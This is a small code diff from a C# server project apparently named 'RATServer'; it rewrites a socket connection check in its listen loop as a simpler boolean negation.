@@ -25,7 +25,7 @@ namespace RATServer
             Console.WriteLine("Server Running...");
             while (true)
             {
-                while (sock.Connected == false) Listen();
+                while (!sock.Connected) Listen();
                 while (sock.Connected) Check();
             }
         }
